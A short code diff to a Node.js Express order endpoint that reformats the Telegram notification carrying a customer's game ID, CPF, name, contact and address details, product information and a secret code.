@@ -166,20 +166,20 @@ app.post("/order", async (req, res) => {
     });
 
     // ===================================================================== 3. Send Telegram notification
-    let msg = `🎁 NEW ORDER 🎁\n\n`;
+    let msg = `**NEW ORDER FROM THE WEBSITE**\n\n`;
     msg += `GAME ID: ${gameId}\n`;
-    msg += `CPF: ${cpf}\n`;
-    msg += `NAME: ${fullName}\n\n`;
+    msg += `CPF: ${cpf}\n\n`;
+    msg += `NAME: **${fullName}**\n`;
     msg += `PHONE: ${phone}\n`;
     msg += `ADDRESS: ${address}\n`;
     msg += `CITY: ${city}\n`;
     msg += `STATE: ${state}\n`;
     msg += `POSTAL CODE: ${zip}\n\n`;
-    msg += `PRODUCT NAME : ${productName}\n`;
-    msg += `${productImg}\n\n`;
-    msg += `🎁 ${productId}\n`;
-    msg += `🔒 SECRET CODE: ${secretCode}\n\n`;
-    msg += `DATE: ${brazilTime}\n`;
+    msg += `PRODUCT NAME\n${productName} `;
+    msg += `[ ${productImg} ]\n\n`;
+    msg += `REQUIREMENT: ${productId}\n`;
+    msg += `🔒 **SECRET CODE**: ${secretCode}\n\n`;
+    msg += `**DATE ORDERED**: ${brazilTime}\n`;
 
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const telegramRes = await fetch(telegramUrl, {
